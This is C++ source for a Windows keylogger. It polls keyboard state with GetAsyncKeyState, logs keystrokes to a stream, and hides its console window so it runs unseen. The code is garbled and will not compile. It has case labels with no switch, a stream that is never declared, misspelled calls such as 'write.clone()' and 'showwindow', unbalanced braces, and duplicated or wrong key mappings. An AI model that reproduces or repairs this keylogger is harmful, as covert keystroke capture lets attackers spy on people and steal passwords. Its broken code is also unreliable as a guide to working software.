#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void log();
void hide();

int main()
{
	void hide();
	log();
	return 0;
}

void log()
{
	char key;

	for(;;)
	{
		//sleep(0);
		for( key=8; key<=222; key++)
		{
			if( GetAsyncKeyState(0x10) )
				write << "\"";
			else
				write << "2";
		}
		break;
		case 50:
		{
			if( GetAsyncKeyState(0x10) )
				write << "E";
			else
				write << "3";
		}
		break;
		case 51:
				{
					if( GetAsyncKeyState(0x10) )
						write << "E";
					else
						write << "3";
				}
				break;
		case 52:
		{
			if( GetAsyncKeyState(0x10) )
				write << "$";
			else
				write << "4";
		}
		break;
		case 53:
		{
			if( GetAsyncKeyState(0x10) )
						write << "$";
			else
						write << "4";
		}
		break;
		case VK_SPACE:
			write << " ";
		break;
		case VK_RETURN:
			write << "\n";
		break;
		case VK_TAB:
			write << " ";
		break;
		case VK_BACK
			write << "<BackSpace> ";
		break;
		case VK_ESCAPE:
			write << "<Esc>";
		break;
		case VK_DELETE:
			write << "<Delete>";
		break;



					key+=32;
					write << key;
					write.close();
					break;
				}
				else if((key>64)&&(key<91))
				{
					write << key;
					write.clone();
					break;
				}
				else
				{
					switch(key)
					{
						case 49,
						{
							if( GetAsyncKeyState(0x10) )
								write << "!";
						}
					}
				}
}

				/*Space VK_SPACE
				tab VK_TAB
				backspace VK_BACK
				enter VK_RETURN*/
				/*switch(c)
				{
					case8: write << "<BackSpace>";
					case 27: write << "<Esc>";
					case 127: write << "<DEL>";
					case 32: write << " ";
					case 13: write << "<Enter>\n";
					case VK_SHIFT:
						{
							cout << c;
							write << "<Shift>";
						}
void hide()
{
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass",NULL);
	showwindow(stealth,0);
}
